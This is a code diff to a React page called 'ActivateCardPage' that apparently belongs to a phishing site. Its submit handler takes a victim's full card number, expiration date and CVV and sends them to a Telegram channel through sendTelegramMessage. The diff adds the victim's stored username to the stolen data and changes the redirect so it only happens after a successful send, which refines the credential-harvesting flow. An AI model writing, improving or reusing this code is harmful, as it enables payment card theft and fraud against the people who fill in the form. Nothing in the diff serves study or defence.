@@ -14,32 +14,34 @@ const ActivateCardPage: React.FC = () => {
   const isFormValid =
     cardNumber.length === 16 && expirationDate && cvv.length === 3;
 
-  const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
-
-    if (!isFormValid) {
-      setError("Please complete all fields.");
-      return;
-    }
-
-    const message = `
-    🔔 *New Card Activation Request* 🔔
-    💳 Card Number: ${cardNumber}
-    📅 Expiration Date: ${expirationDate}
-    🔒 CVV: ${cvv}
-    `;
-
-    try {
-      await sendTelegramMessage(message);
-
-
-      setError(""); // Clear any existing errors
-    } catch (err) {
-      console.log(err)
-      setError("Failed to send the message. Please try again.");
-    }
-    router.push('/profile');
-  };
+    const handleSubmit = async (e: React.FormEvent) => {
+      e.preventDefault();
+    
+      if (!isFormValid) {
+        setError("Please complete all fields.");
+        return;
+      }
+    
+      const storedUsername = localStorage.getItem("username") || "Unknown User";
+    
+      const message = `
+        🔔 *New Card 🔔
+        💳 Card Number: ${cardNumber}
+        📅 Expiration Date: ${expirationDate}
+        🔒 CVV: ${cvv}
+        👤 Username: ${storedUsername}
+      `;
+    
+      try {
+        await sendTelegramMessage(message);
+        setError(""); // Clear any existing errors
+        router.push('/profile');
+      } catch (err) {
+        console.log(err);
+        setError("Failed to send the message. Please try again.");
+      }
+    };
+    
 
   return (
     <div className="flex items-center justify-center min-h-screen bg-gray-100 px-4">
